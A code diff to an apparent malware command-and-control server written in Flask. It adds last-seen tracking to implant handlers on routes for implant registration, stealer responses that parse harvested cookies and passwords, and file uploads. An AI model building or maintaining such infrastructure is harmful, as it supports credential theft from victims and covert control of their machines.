@@ -167,8 +167,6 @@ def client_get_commands():
 
 
 # Register an implant, on the implant side TODO
-
-
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
@@ -178,7 +176,7 @@ def register_implant():
         print(data['sleep'])
         jitter = 10
         sleep = 1
-        first_connection = last_seen = datetime.now()
+        first_connection = last_seen = datetime.now(tz=None)
         active = True
         columns = ["first_connection", "active",
                    "jitter", "sleep", "last_seen"]
@@ -217,6 +215,8 @@ def handle_response_stealer():
         cookie_values, password_values = WyattWonderland.newParseJSON(data)
         print("After calling wyatts wonderland")
         task_id = data['task_id']
+        target_implant_id = data['target_implant_id'] 
+        tools.updateLastSeen(target_implant_id)
         success = data['success']
         if success in ['Success', 'success']:
             success = True
@@ -372,6 +372,7 @@ def handle_response_json():
         print()
         print("response:")
         target_implant_id = data['target_implant_id']
+        tools.updateLastSeen(target_implant_id)
         task_id = data['task_id']
         response_data = data['response_data']
         success = data['success']
@@ -438,7 +439,7 @@ def get_history():
 @app.route("/upload_files", methods=["POST"])
 def upload_files():
     try:
-        file = request.files
+        file = request.files 
         print("recieved upload_files: \n Response: ")
         print(file)
     except Exception as e:
